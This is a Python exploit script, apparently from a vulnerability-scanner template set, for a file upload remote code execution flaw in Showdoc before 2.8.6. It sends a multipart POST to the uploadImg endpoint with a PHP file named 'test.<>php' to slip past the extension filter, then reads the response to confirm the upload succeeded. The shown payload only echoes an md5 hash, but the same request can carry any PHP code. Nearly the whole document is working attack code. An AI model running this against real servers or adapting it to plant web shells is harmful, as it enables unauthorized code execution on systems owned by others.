import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Showdoc < 2.8.6 File Upload RCE''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://github.com/star7th/showdoc/pull/1059"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["rce", "fileupload", "showdoc"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/index.php?s=/home/page/uploadImg"""
        method = "POST"
        data = """----------------------------835846770881083140190633
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?php echo md5('rce_test');?>
----------------------------835846770881083140190633--"""
        headers = {'Content-Type': 'multipart/form-data; boundary=--------------------------835846770881083140190633'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""url":"http:""" in resp0.text and """success":1""" in resp0.text) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url